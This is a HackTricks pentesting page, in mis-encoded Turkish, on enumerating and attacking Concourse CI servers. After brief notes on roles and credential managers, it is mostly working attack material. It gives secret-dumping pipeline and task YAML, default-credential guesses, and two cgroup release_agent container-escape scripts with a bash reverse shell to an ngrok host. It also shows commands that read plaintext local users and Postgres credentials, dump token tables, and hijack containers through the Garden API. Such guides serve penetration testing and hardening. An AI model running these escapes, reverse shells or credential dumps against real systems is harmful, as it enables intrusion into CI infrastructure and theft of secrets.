# Concourse Enumeration & Attacks

## Concourse Enumeration & Attacks

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ Discord grubuna** [**katÄ±lÄ±n**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) **bizi takip edin**.
* **HackTricks'e PR gÃ¶ndererek hacking ipuÃ§larÄ±nÄ± paylaÅŸÄ±n** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na.

</details>
{% endhint %}

### KullanÄ±cÄ± Rolleri ve Ä°zinler

Concourse beÅŸ rolle gelir:

* _Concourse_ **Admin**: Bu rol yalnÄ±zca **ana takÄ±mÄ±n** (varsayÄ±lan baÅŸlangÄ±Ã§ concourse takÄ±mÄ±) sahiplerine verilir. Adminler **diÄŸer takÄ±mlarÄ± yapÄ±landÄ±rabilir** (Ã¶rneÄŸin: `fly set-team`, `fly destroy-team`...). Bu rolÃ¼n izinleri RBAC tarafÄ±ndan etkilenemez.
* **owner**: TakÄ±m sahipleri **takÄ±m iÃ§indeki her ÅŸeyi deÄŸiÅŸtirebilir**.
* **member**: TakÄ±m Ã¼yeleri **takÄ±m varlÄ±klarÄ± iÃ§inde okuma ve yazma** yapabilir ancak takÄ±m ayarlarÄ±nÄ± deÄŸiÅŸtiremez.
* **pipeline-operator**: Pipeline operatÃ¶rleri **pipeline iÅŸlemleri** gerÃ§ekleÅŸtirebilir, Ã¶rneÄŸin build'leri tetikleme ve kaynaklarÄ± sabitleme, ancak pipeline yapÄ±landÄ±rmalarÄ±nÄ± gÃ¼ncelleyemezler.
* **viewer**: TakÄ±m izleyicileri **takÄ±ma ve pipeline'larÄ±na yalnÄ±zca okuma eriÅŸimine** sahiptir.

{% hint style="info" %}
AyrÄ±ca, **owner, member, pipeline-operator ve viewer rollerinin izinleri** RBAC yapÄ±landÄ±rÄ±larak (daha spesifik olarak eylemleri yapÄ±landÄ±rarak) deÄŸiÅŸtirilebilir. Daha fazla bilgi iÃ§in okuyun: [https://concourse-ci.org/user-roles.html](https://concourse-ci.org/user-roles.html)
{% endhint %}

Concourse'un **pipeline'larÄ± TakÄ±mlar iÃ§inde grupladÄ±ÄŸÄ±nÄ±** unutmayÄ±n. Bu nedenle bir TakÄ±ma ait kullanÄ±cÄ±lar bu pipeline'larÄ± yÃ¶netebilir ve **birden fazla TakÄ±m** olabilir. Bir kullanÄ±cÄ± birden fazla TakÄ±ma ait olabilir ve her birinde farklÄ± izinlere sahip olabilir.

### Vars & Credential Manager

YAML yapÄ±landÄ±rmalarÄ±nda `((_source-name_:_secret-path_._secret-field_))` sÃ¶zdizimini kullanarak deÄŸerler yapÄ±landÄ±rabilirsiniz.\
[Belgelerden:](https://concourse-ci.org/vars.html#var-syntax) **source-name isteÄŸe baÄŸlÄ±dÄ±r**, ve belirtilmezse, [cluster-wide credential manager](https://concourse-ci.org/vars.html#cluster-wide-credential-manager) kullanÄ±lacak veya deÄŸer [statik olarak](https://concourse-ci.org/vars.html#static-vars) saÄŸlanabilir.\
**Ä°steÄŸe baÄŸlÄ± \_secret-field**\_, okunacak alÄ±nan gizli bilginin bir alanÄ±nÄ± belirtir. Belirtilmezse, credential manager, alan mevcutsa alÄ±nan credential'dan 'varsayÄ±lan bir alan' okumayÄ± seÃ§ebilir.\
AyrÄ±ca, _**secret-path**_ ve _**secret-field**_ Ã¶zel karakterler iÃ§eriyorsa `"..."` Ã§ift tÄ±rnak iÃ§ine alÄ±nabilir. Ã–rneÄŸin, `((source:"my.secret"."field:1"))` _secret-path_'i `my.secret` ve _secret-field_'i `field:1` olarak ayarlayacaktÄ±r.

#### Statik Vars

Statik vars **gÃ¶rev adÄ±mlarÄ±nda** belirtilebilir:
```yaml
- task: unit-1.13
file: booklit/ci/unit.yml
vars: {tag: 1.13}
```
Veya aÅŸaÄŸÄ±daki `fly` **argÃ¼manlarÄ±nÄ±** kullanarak:

* `-v` veya `--var` `NAME=VALUE` dizesini `NAME` deÄŸiÅŸkeni iÃ§in deÄŸer olarak ayarlar.
* `-y` veya `--yaml-var` `NAME=VALUE` `VALUE`'yi YAML olarak ayrÄ±ÅŸtÄ±rÄ±r ve `NAME` deÄŸiÅŸkeni iÃ§in deÄŸer olarak ayarlar.
* `-i` veya `--instance-var` `NAME=VALUE` `VALUE`'yi YAML olarak ayrÄ±ÅŸtÄ±rÄ±r ve instance var `NAME` iÃ§in deÄŸer olarak ayarlar. Instance vars hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Grouping Pipelines](https://concourse-ci.org/instanced-pipelines.html) sayfasÄ±na bakÄ±n.
* `-l` veya `--load-vars-from` `FILE` `FILE`'yi, deÄŸiÅŸken adlarÄ±nÄ± deÄŸerlere eÅŸleyen bir YAML belgesi yÃ¼kler ve hepsini ayarlar.

#### Credential Management

Bir **Credential Manager**'Ä±n bir pipeline'da nasÄ±l belirtilebileceÄŸine dair farklÄ± yollar vardÄ±r, [https://concourse-ci.org/creds.html](https://concourse-ci.org/creds.html) adresinden nasÄ±l olduÄŸunu okuyun.\
AyrÄ±ca, Concourse farklÄ± credential manager'larÄ± destekler:

* [The Vault credential manager](https://concourse-ci.org/vault-credential-manager.html)
* [The CredHub credential manager](https://concourse-ci.org/credhub-credential-manager.html)
* [The AWS SSM credential manager](https://concourse-ci.org/aws-ssm-credential-manager.html)
* [The AWS Secrets Manager credential manager](https://concourse-ci.org/aws-asm-credential-manager.html)
* [Kubernetes Credential Manager](https://concourse-ci.org/kubernetes-credential-manager.html)
* [The Conjur credential manager](https://concourse-ci.org/conjur-credential-manager.html)
* [Caching credentials](https://concourse-ci.org/creds-caching.html)
* [Redacting credentials](https://concourse-ci.org/creds-redacting.html)
* [Retrying failed fetches](https://concourse-ci.org/creds-retry-logic.html)

{% hint style="danger" %}
Concourse'a **yazma eriÅŸiminiz** varsa, Concourse'un bu sÄ±rlarÄ± eriÅŸebilmesi gerektiÄŸinden, bu sÄ±rlarÄ± **dÄ±ÅŸarÄ± Ã§Ä±karacak iÅŸler** oluÅŸturabileceÄŸinizi unutmayÄ±n.
{% endhint %}

### Concourse Enumeration

Bir concourse ortamÄ±nÄ± numaralandÄ±rmak iÃ§in Ã¶nce **geÃ§erli kimlik bilgilerini toplamanÄ±z** veya muhtemelen bir `.flyrc` yapÄ±landÄ±rma dosyasÄ±nda bir **kimlik doÄŸrulama jetonu** bulmanÄ±z gerekir.

#### Login ve Mevcut KullanÄ±cÄ± enum

* GiriÅŸ yapmak iÃ§in **endpoint**, **takÄ±m adÄ±** (varsayÄ±lan `main`) ve kullanÄ±cÄ±nÄ±n ait olduÄŸu bir **takÄ±m** bilmeniz gerekir:
* `fly --target example login --team-name my-team --concourse-url https://ci.example.com [--insecure] [--client-cert=./path --client-key=./path]`
* YapÄ±landÄ±rÄ±lmÄ±ÅŸ **hedefleri** alÄ±n:
* `fly targets`
* YapÄ±landÄ±rÄ±lmÄ±ÅŸ **hedef baÄŸlantÄ±sÄ±nÄ±n** hala **geÃ§erli** olup olmadÄ±ÄŸÄ±nÄ± Ã¶ÄŸrenin:
* `fly -t <target> status`
* Belirtilen hedefe karÅŸÄ± kullanÄ±cÄ±nÄ±n **rolÃ¼nÃ¼** alÄ±n:
* `fly -t <target> userinfo`

{% hint style="info" %}
**API token**'Ä±nÄ±n varsayÄ±lan olarak `$HOME/.flyrc`'de **kaydedildiÄŸini** unutmayÄ±n, bir makineyi yaÄŸmalarken orada kimlik bilgilerini bulabilirsiniz.
{% endhint %}

#### TakÄ±mlar & KullanÄ±cÄ±lar

* TakÄ±mlarÄ±n bir listesini alÄ±n
* `fly -t <target> teams`
* TakÄ±m iÃ§indeki rolleri alÄ±n
* `fly -t <target> get-team -n <team-name>`
* KullanÄ±cÄ±larÄ±n bir listesini alÄ±n
* `fly -t <target> active-users`

#### Pipelines

* Pipelines **listesi**:
* `fly -t <target> pipelines -a`
* Pipeline yaml'Ä±nÄ± **alÄ±n** (**hassas bilgiler** tanÄ±mda bulunabilir):
* `fly -t <target> get-pipeline -p <pipeline-name>`
* TÃ¼m pipeline **config declared vars**'Ä± alÄ±n
* `for pipename in $(fly -t <target> pipelines | grep -Ev "^id" | awk '{print $2}'); do echo $pipename; fly -t <target> get-pipeline -p $pipename -j | grep -Eo '"vars":[^}]+'; done`
* KullanÄ±lan tÃ¼m **pipelines secret names**'i alÄ±n (eÄŸer bir iÅŸ oluÅŸturabilir/deÄŸiÅŸtirebilir veya bir konteyneri ele geÃ§irebilirseniz, onlarÄ± dÄ±ÅŸarÄ± Ã§Ä±karabilirsiniz):
```bash
rm /tmp/secrets.txt;
for pipename in $(fly -t onelogin pipelines | grep -Ev "^id" | awk '{print $2}'); do
echo $pipename;
fly -t onelogin get-pipeline -p $pipename | grep -Eo '\(\(.*\)\)' | sort | uniq | tee -a /tmp/secrets.txt;
echo "";
done
echo ""
echo "ALL SECRETS"
cat /tmp/secrets.txt | sort | uniq
rm /tmp/secrets.txt
```
#### Containers & Workers

* **workers** listele:
* `fly -t <target> workers`
* **containers** listele:
* `fly -t <target> containers`
* **builds** listele (Ã§alÄ±ÅŸanlarÄ± gÃ¶rmek iÃ§in):
* `fly -t <target> builds`

### Concourse SaldÄ±rÄ±larÄ±

#### Credentials Brute-Force

* admin:admin
* test:test

#### Secrets ve parametrelerin listelenmesi

Ã–nceki bÃ¶lÃ¼mde, pipeline tarafÄ±ndan kullanÄ±lan **tÃ¼m secrets isimlerini ve deÄŸiÅŸkenlerini nasÄ±l alabileceÄŸinizi** gÃ¶rdÃ¼k. **DeÄŸiÅŸkenler hassas bilgiler iÃ§erebilir** ve **secrets isimleri** daha sonra onlarÄ± **Ã§almaya Ã§alÄ±ÅŸmak** iÃ§in faydalÄ± olacaktÄ±r.

#### Ã‡alÄ±ÅŸan veya yakÄ±n zamanda Ã§alÄ±ÅŸmÄ±ÅŸ container iÃ§inde oturum

Yeterli ayrÄ±calÄ±klara sahipseniz (**Ã¼ye rolÃ¼ veya daha fazlasÄ±**) **pipelines ve rolleri listeleyebilir** ve sadece `<pipeline>/<job>` **container** iÃ§inde bir **oturum** aÃ§abilirsiniz:
```bash
fly -t tutorial intercept --job pipeline-name/job-name
fly -t tutorial intercept # To be presented a prompt with all the options
```
Bu izinlerle ÅŸunlarÄ± yapabilirsiniz:

* **Container** iÃ§indeki **gizli bilgileri Ã§almak**
* Node'a **kaÃ§mayÄ±** denemek
* **Cloud metadata** endpoint'ini (mÃ¼mkÃ¼nse pod'dan ve node'dan) numaralandÄ±rmak/KÃ¶tÃ¼ye kullanmak

#### Pipeline OluÅŸturma/DeÄŸiÅŸtirme

Yeterli ayrÄ±calÄ±klara sahipseniz (**Ã¼ye rolÃ¼ veya daha fazlasÄ±**) **yeni pipeline'lar oluÅŸturabilir/deÄŸiÅŸtirebilirsiniz.** Bu Ã¶rneÄŸi inceleyin:
```yaml
jobs:
- name: simple
plan:
- task: simple-task
privileged: true
config:
# Tells Concourse which type of worker this task should run on
platform: linux
image_resource:
type: registry-image
source:
repository: busybox # images are pulled from docker hub by default
run:
path: sh
args:
- -cx
- |
echo "$SUPER_SECRET"
sleep 1000
params:
SUPER_SECRET: ((super.secret))
```
Yeni bir pipeline'Ä±n **deÄŸiÅŸtirilmesi/oluÅŸturulmasÄ±** ile ÅŸunlarÄ± yapabilirsiniz:

* **SÄ±rlarÄ± Ã‡al** (echo ile dÄ±ÅŸarÄ± Ã§Ä±kararak veya konteynerin iÃ§ine girip `env` Ã§alÄ±ÅŸtÄ±rarak)
* **Node'a KaÃ§** (yeterli ayrÄ±calÄ±klarÄ± vererek - `privileged: true`)
* **Cloud metadata** endpoint'ini numaralandÄ±r/istismar et (pod'dan ve node'dan)
* OluÅŸturulan pipeline'Ä± **Sil**

#### Ã–zel GÃ¶rev YÃ¼rÃ¼tme

Bu, Ã¶nceki yÃ¶nteme benzer, ancak tÃ¼m yeni bir pipeline'Ä± deÄŸiÅŸtirmek/oluÅŸturmak yerine **sadece Ã¶zel bir gÃ¶rev yÃ¼rÃ¼t** (bu muhtemelen Ã§ok daha **gizli** olacaktÄ±r):
```yaml
# For more task_config options check https://concourse-ci.org/tasks.html
platform: linux
image_resource:
type: registry-image
source:
repository: ubuntu
run:
path: sh
args:
- -cx
- |
env
sleep 1000
params:
SUPER_SECRET: ((super.secret))
```

```bash
fly -t tutorial execute --privileged --config task_config.yml
```
#### AyrÄ±calÄ±klÄ± gÃ¶revden node'a kaÃ§Ä±ÅŸ

Ã–nceki bÃ¶lÃ¼mlerde **concourse ile ayrÄ±calÄ±klÄ± bir gÃ¶revi nasÄ±l yÃ¼rÃ¼teceÄŸimizi** gÃ¶rdÃ¼k. Bu, konteynere bir docker konteynerindeki ayrÄ±calÄ±klÄ± bayrak ile tam olarak aynÄ± eriÅŸimi saÄŸlamaz. Ã–rneÄŸin, /dev iÃ§inde node dosya sistemi cihazÄ±nÄ± gÃ¶remezsiniz, bu nedenle kaÃ§Ä±ÅŸ daha "karmaÅŸÄ±k" olabilir.

AÅŸaÄŸÄ±daki PoC'de bazÄ± kÃ¼Ã§Ã¼k deÄŸiÅŸikliklerle release\_agent kullanarak kaÃ§Ä±ÅŸ yapacaÄŸÄ±z:
```bash
# Mounts the RDMA cgroup controller and create a child cgroup
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the memory cgroup controller, try change memory to rdma to fix it
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release


# CHANGE ME
# The host path will look like the following, but you need to change it:
host_path="/mnt/vda1/hostpath-provisioner/default/concourse-work-dir-concourse-release-worker-0/overlays/ae7df0ca-0b38-4c45-73e2-a9388dcb2028/rootfs"

## The initial path "/mnt/vda1" is probably the same, but you can check it using the mount command:
#/dev/vda1 on /scratch type ext4 (rw,relatime)
#/dev/vda1 on /tmp/build/e55deab7 type ext4 (rw,relatime)
#/dev/vda1 on /etc/hosts type ext4 (rw,relatime)
#/dev/vda1 on /etc/resolv.conf type ext4 (rw,relatime)

## Then next part I think is constant "hostpath-provisioner/default/"

## For the next part "concourse-work-dir-concourse-release-worker-0" you need to know how it's constructed
# "concourse-work-dir" is constant
# "concourse-release" is the consourse prefix of the current concourse env (you need to find it from the API)
# "worker-0" is the name of the worker the container is running in (will be usually that one or incrementing the number)

## The final part "overlays/bbedb419-c4b2-40c9-67db-41977298d4b3/rootfs" is kind of constant
# running `mount | grep "on / " | grep -Eo "workdir=([^,]+)"` you will see something like:
# workdir=/concourse-work-dir/overlays/work/ae7df0ca-0b38-4c45-73e2-a9388dcb2028
# the UID is the part we are looking for

# Then the host_path is:
#host_path="/mnt/<device>/hostpath-provisioner/default/concourse-work-dir-<concourse_prefix>-worker-<num>/overlays/<UID>/rootfs"

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent


#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% hint style="warning" %}
Fark etmiÅŸ olabileceÄŸiniz gibi bu sadece bir [**regular release\_agent escape**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/concourse-security/broken-reference/README.md), sadece dÃ¼ÄŸÃ¼mdeki cmd yolunu deÄŸiÅŸtiriyor
{% endhint %}

#### Worker konteynerinden dÃ¼ÄŸÃ¼me kaÃ§Ä±ÅŸ

KÃ¼Ã§Ã¼k bir deÄŸiÅŸiklikle bir regular release\_agent escape yeterlidir:
```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -n 1`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
#### Web konteynerinden dÃ¼ÄŸÃ¼me kaÃ§Ä±ÅŸ

Web konteyneri bazÄ± savunmalarÄ± devre dÄ±ÅŸÄ± bÄ±rakmÄ±ÅŸ olsa bile, **yaygÄ±n ayrÄ±calÄ±klÄ± bir konteyner olarak Ã§alÄ±ÅŸmÄ±yor** (Ã¶rneÄŸin, **mount** yapamazsÄ±nÄ±z ve **yetkiler** Ã§ok **sÄ±nÄ±rlÄ±dÄ±r**, bu yÃ¼zden konteynerden kaÃ§manÄ±n kolay yollarÄ± iÅŸe yaramaz).

Ancak, **yerel kimlik bilgilerini aÃ§Ä±k metin olarak** saklar:
```bash
cat /concourse-auth/local-users
test:test

env | grep -i local_user
CONCOURSE_MAIN_TEAM_LOCAL_USER=test
CONCOURSE_ADD_LOCAL_USER=test:test
```
Bu kimlik bilgilerini **web sunucusuna karÅŸÄ± giriÅŸ yapmak** ve **ayrÄ±calÄ±klÄ± bir konteyner oluÅŸturup node'a kaÃ§mak** iÃ§in kullanabilirsiniz.

Ortamda ayrÄ±ca concourse'un kullandÄ±ÄŸÄ± **postgresql** Ã¶rneÄŸine eriÅŸim iÃ§in bilgi bulabilirsiniz (adres, **kullanÄ±cÄ± adÄ±**, **ÅŸifre** ve diÄŸer bilgiler arasÄ±nda veritabanÄ±):
```bash
env | grep -i postg
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_ADDR=10.107.191.238
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_PORT=5432
CONCOURSE_RELEASE_POSTGRESQL_SERVICE_PORT_TCP_POSTGRESQL=5432
CONCOURSE_POSTGRES_USER=concourse
CONCOURSE_POSTGRES_DATABASE=concourse
CONCOURSE_POSTGRES_PASSWORD=concourse
[...]

# Access the postgresql db
psql -h 10.107.191.238 -U concourse -d concourse
select * from password; #Find hashed passwords
select * from access_tokens;
select * from auth_code;
select * from client;
select * from refresh_token;
select * from teams; #Change the permissions of the users in the teams
select * from users;
```
#### Garden Servisini KÃ¶tÃ¼ye Kullanma - GerÃ§ek Bir SaldÄ±rÄ± DeÄŸil

{% hint style="warning" %}
Bunlar hizmet hakkÄ±nda bazÄ± ilginÃ§ notlar, ancak yalnÄ±zca localhost'ta dinlediÄŸi iÃ§in, bu notlar daha Ã¶nce zaten istismar etmediÄŸimiz herhangi bir etki yaratmayacaktÄ±r.
{% endhint %}

VarsayÄ±lan olarak, her concourse worker [**Garden**](https://github.com/cloudfoundry/garden) servisini 7777 portunda Ã§alÄ±ÅŸtÄ±racaktÄ±r. Bu hizmet, Web master tarafÄ±ndan worker'a **ne yapmasÄ± gerektiÄŸini** (gÃ¶rÃ¼ntÃ¼yÃ¼ indir ve her gÃ¶revi Ã§alÄ±ÅŸtÄ±r) belirtmek iÃ§in kullanÄ±lÄ±r. Bu bir saldÄ±rgan iÃ§in oldukÃ§a iyi gÃ¶rÃ¼nÃ¼yor, ancak bazÄ± gÃ¼zel korumalar var:

* Sadece **yerel olarak aÃ§Ä±ÄŸa Ã§Ä±kar** (127.0.0.1) ve sanÄ±rÄ±m worker, Ã¶zel SSH hizmeti ile Web'e karÅŸÄ± kimlik doÄŸrulamasÄ± yaptÄ±ÄŸÄ±nda, web sunucusunun her worker iÃ§indeki **her Garden hizmetiyle konuÅŸabilmesi** iÃ§in bir tÃ¼nel oluÅŸturuluyor.
* Web sunucusu **her birkaÃ§ saniyede bir Ã§alÄ±ÅŸan konteynerleri izliyor** ve **beklenmedik** konteynerler **siliniyor**. Bu yÃ¼zden **Ã¶zel bir konteyner Ã§alÄ±ÅŸtÄ±rmak** istiyorsanÄ±z, web sunucusu ile garden hizmeti arasÄ±ndaki **iletiÅŸimi kurcalamanÄ±z** gerekiyor.

Concourse worker'lar yÃ¼ksek konteyner ayrÄ±calÄ±klarÄ±yla Ã§alÄ±ÅŸÄ±r:
```
Container Runtime: docker
Has Namespaces:
pid: true
user: false
AppArmor Profile: kernel
Capabilities:
BOUNDING -> chown dac_override dac_read_search fowner fsetid kill setgid setuid setpcap linux_immutable net_bind_service net_broadcast net_admin net_raw ipc_lock ipc_owner sys_module sys_rawio sys_chroot sys_ptrace sys_pacct sys_admin sys_boot sys_nice sys_resource sys_time sys_tty_config mknod lease audit_write audit_control setfcap mac_override mac_admin syslog wake_alarm block_suspend audit_read
Seccomp: disabled
```
Ancak, dÃ¼ÄŸÃ¼mÃ¼n /dev cihazÄ±nÄ± **mount etme** veya release\_agent gibi teknikler **Ã§alÄ±ÅŸmaz** (Ã§Ã¼nkÃ¼ dÃ¼ÄŸÃ¼mÃ¼n dosya sistemiyle gerÃ§ek cihaz eriÅŸilebilir deÄŸil, sadece sanal bir cihaz var). DÃ¼ÄŸÃ¼mÃ¼n sÃ¼reÃ§lerine eriÅŸemiyoruz, bu yÃ¼zden kernel exploitleri olmadan dÃ¼ÄŸÃ¼mden kaÃ§mak zorlaÅŸÄ±yor.

{% hint style="info" %}
Ã–nceki bÃ¶lÃ¼mde ayrÄ±calÄ±klÄ± bir konteynerden nasÄ±l kaÃ§Ä±lacaÄŸÄ±nÄ± gÃ¶rdÃ¼k, bu yÃ¼zden **mevcut** **worker** tarafÄ±ndan oluÅŸturulan bir **ayrÄ±calÄ±klÄ± konteynerde** komutlar **Ã§alÄ±ÅŸtÄ±rabilirsek**, **dÃ¼ÄŸÃ¼me kaÃ§abiliriz**.
{% endhint %}

Concourse ile oynarken fark ettim ki yeni bir konteyner bir ÅŸey Ã§alÄ±ÅŸtÄ±rmak iÃ§in oluÅŸturulduÄŸunda, konteyner sÃ¼reÃ§leri worker konteynerinden eriÅŸilebilir, yani bir konteynerin iÃ§inde yeni bir konteyner oluÅŸturmak gibi.

**Ã‡alÄ±ÅŸan bir ayrÄ±calÄ±klÄ± konteynere girmek**
```bash
# Get current container
curl 127.0.0.1:7777/containers
{"Handles":["ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

# Get container info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/properties

# Execute a new process inside a container
## In this case "sleep 20000" will be executed in the container with handler ac793559-7f53-4efc-6591-0171a0391e53
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
--header='Content-Type:application/json' \
'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'

# OR instead of doing all of that, you could just get into the ns of the process of the privileged container
nsenter --target 76011 --mount --uts --ipc --net --pid -- sh
```
**Yeni ayrÄ±calÄ±klÄ± bir konteyner oluÅŸturma**

Ã‡ok kolay bir ÅŸekilde yeni bir konteyner oluÅŸturabilir (sadece rastgele bir UID Ã§alÄ±ÅŸtÄ±rÄ±n) ve Ã¼zerinde bir ÅŸeyler Ã§alÄ±ÅŸtÄ±rabilirsiniz:
```bash
curl -X POST http://127.0.0.1:7777/containers \
-H 'Content-Type: application/json' \
-d '{"handle":"123ae8fc-47ed-4eab-6b2e-123458880690","rootfs":"raw:///concourse-work-dir/volumes/live/ec172ffd-31b8-419c-4ab6-89504de17196/volume","image":{},"bind_mounts":[{"src_path":"/concourse-work-dir/volumes/live/9f367605-c9f0-405b-7756-9c113eba11f1/volume","dst_path":"/scratch","mode":1}],"properties":{"user":""},"env":["BUILD_ID=28","BUILD_NAME=24","BUILD_TEAM_ID=1","BUILD_TEAM_NAME=main","ATC_EXTERNAL_URL=http://127.0.0.1:8080"],"limits":{"bandwidth_limits":{},"cpu_limits":{},"disk_limits":{},"memory_limits":{},"pid_limits":{}}}'

# Wget will be stucked there as long as the process is being executed
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
--header='Content-Type:application/json' \
'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'
```
Ancak, web sunucusu her birkaÃ§ saniyede bir Ã§alÄ±ÅŸan konteynerleri kontrol ediyor ve beklenmedik bir konteyner keÅŸfedilirse, silinecektir. Ä°letiÅŸim HTTP Ã¼zerinden gerÃ§ekleÅŸtiÄŸinden, beklenmedik konteynerlerin silinmesini Ã¶nlemek iÃ§in iletiÅŸimi kurcalayabilirsiniz:
```
GET /containers HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
.

T 127.0.0.1:7777 -> 127.0.0.1:59722 [AP] #157
HTTP/1.1 200 OK.
Content-Type: application/json.
Date: Thu, 17 Mar 2022 22:42:55 GMT.
Content-Length: 131.
.
{"Handles":["123ae8fc-47ed-4eab-6b2e-123458880690","ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

T 127.0.0.1:59722 -> 127.0.0.1:7777 [AP] #159
DELETE /containers/123ae8fc-47ed-4eab-6b2e-123458880690 HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
```
## Referanslar

* https://concourse-ci.org/vars.html

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **bizi takip edin** **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **HackTricks'e PR gÃ¶ndererek hacking ipuÃ§larÄ±nÄ± paylaÅŸÄ±n** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na.

</details>
{% endhint %}
